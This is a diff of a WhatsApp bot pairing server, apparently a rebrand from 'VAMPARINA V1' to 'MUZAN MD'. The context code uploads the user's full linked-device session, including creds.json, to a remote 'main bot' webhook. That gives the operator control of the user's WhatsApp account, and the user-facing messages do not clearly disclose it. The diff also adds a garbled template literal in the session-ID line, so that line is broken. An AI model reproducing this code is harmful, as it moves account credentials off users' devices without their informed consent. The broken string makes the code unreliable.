@@ -29,7 +29,7 @@ function removeFile(FilePath) {
     }
 }
 
-// AUTO SEND FULL SESSION TO MAIN BOT (THE MAGIC HAPPENS HERE)
+// AUTO SEND FULL SESSION TO MAIN BOT
 async function sendSessionToMainBot(sessionDir) {
     try {
         const files = [];
@@ -42,7 +42,7 @@ async function sendSessionToMainBot(sessionDir) {
         }
 
         const phone = JSON.parse(files.find(f => f.name === 'creds.json')?.content || '{}')?.me?.id?.split(':')[0] || 'unknown';
-        const sessionId = `qr_vamparina_${phone}_${Date.now()}`;
+        const sessionId = `qr_muzan_\( {phone}_ \){Date.now()}`;
 
         const payload = {
             sessionId,
@@ -57,7 +57,7 @@ async function sendSessionToMainBot(sessionDir) {
         });
 
         if (response.ok) {
-            console.log(`SESSION SENT & BOT ACTIVATED → ${phone}`);
+            console.log(`✅ SESSION SENT & MUZAN MD ACTIVATED → ${phone}`);
         } else {
             console.log("Failed to activate main bot (webhook error)");
         }
@@ -96,12 +96,12 @@ router.get('/', async (req, res) => {
                     responseSent = true;
                     res.json({
                         qr: qrDataURL,
-                        message: "Scan this QR to activate your VAMPARINA V1 bot!",
+                        message: "Scan this QR to activate your MUZAN MD bot!",
                         instructions: [
-                            "1. Open WhatsApp",
+                            "1. Open WhatsApp on your phone",
                             "2. Go to Settings > Linked Devices",
                             "3. Tap 'Link a Device'",
-                            "4. Scan this QR code"
+                            "4. Scan the QR code above"
                         ]
                     });
                 }
@@ -135,7 +135,7 @@ router.get('/', async (req, res) => {
             }
 
             if (connection === 'open') {
-                console.log('CONNECTED VIA QR! ACTIVATING MAIN BOT...');
+                console.log('✅ MUZAN MD CONNECTED VIA QR! ACTIVATING MAIN BOT...');
 
                 // AUTO SEND SESSION TO MAIN BOT
                 await sendSessionToMainBot(dirs);
@@ -144,12 +144,12 @@ router.get('/', async (req, res) => {
 
                 if (userJid) {
                     await sock.sendMessage(userJid, {
-                        text: `*VAMPARINA V1 IS NOW LIVE & ACTIVE!*\n\nYour bot has been automatically activated on our main server!\n\nFeatures:\n• Auto joined group\n• Auto followed channel\n• You are now sudo owner\n\n© 2025 Arnold Chirchir`
+                        text: `*MUZAN MD IS NOW LIVE & ACTIVE!*\n\nYour bot has been automatically activated on our main server!\n\nFeatures:\n• Auto joined group\n• Auto followed channel\n• You are now Sudo Owner\n\n© 2025 Arnold Der Abenteurer`
                     });
 
                     await sock.sendMessage(userJid, {
                         image: { url: 'https://img.youtube.com/vi/-oz_u1iMgf8/maxresdefault.jpg' },
-                        caption: `*VAMPARINA MD V2.0 Full Setup Guide!*\nWatch Now: https://youtu.be/-oz_u1iMgf8`
+                        caption: `*MUZAN MD Full Setup Guide*\nWatch Now: https://youtu.be/-oz_u1iMgf8`
                     });
                 }
 
